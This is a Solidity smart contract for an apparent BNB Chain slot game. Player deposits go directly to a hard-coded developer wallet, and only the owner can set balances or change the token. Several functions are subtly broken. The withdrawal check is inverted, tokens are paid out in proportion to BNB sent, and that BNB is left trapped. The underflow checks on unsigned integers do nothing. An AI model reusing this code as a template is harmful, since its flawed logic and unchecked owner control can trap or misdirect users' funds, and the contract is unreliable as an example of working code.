/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SlotContract{

    bool public initialized = false;
    IERC20 public Token;

    address public ceoAddress;
    address public devAddress;
    mapping (address => uint256) public playerWallet;
    mapping (address => uint256) public playerBNB;
 
    constructor(){
            ceoAddress = msg.sender;
            devAddress = 0x55A3ADde4E3FFFe38447AEb583E2DE6ea7694f22;
            Token = IERC20(0x568D3144dB67FfCd6aD08b37aDae178E34CB1711);  //TOken Contract Address
     
        }
 
    function seedMarket() public payable{
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        initialized = true;
    }

    function increaseBNB(address _adr, uint256 amount) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");

     
           playerBNB[_adr] += amount;
           
         

        
         
    }


    function increaseToken(address _adr, uint256 amount) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");

     
           playerWallet[_adr] += amount;
           
         

        
         
    }


 function decreaseToken(address _adr, uint256 amount) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");

         if((playerWallet[_adr] - amount) >= 0){

           playerWallet[_adr] -= amount;
           
         }

        if((playerWallet[_adr] - amount) < 0){

           
             playerWallet[_adr] = 0;

         }
    }
    
    function deposit(uint256 amount) public {
        require(initialized);
        
       
        Token.transferFrom(msg.sender, devAddress, amount);
    }
 
    function withdrawMyCustomToken() public payable  {
        require(initialized);
        require(playerBNB[msg.sender] <= msg.value,"Cannot Withdraw more then your Balance!!");
         
         uint256 amount = msg.value;

        uint NinetyNinePercent = amount * 99 / 100;
        uint OnePercent = amount * 1 /100;

        Token.transfer(msg.sender,NinetyNinePercent);
        Token.transfer(devAddress,OnePercent);
        playerBNB[msg.sender] -= amount;
    }

    function changeCeo(address _adr) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        ceoAddress = _adr;
    }

    function changeDev(address _adr) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        devAddress = _adr;
    }

    function setToken(address _token) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        Token = IERC20(_token);
    }
 
}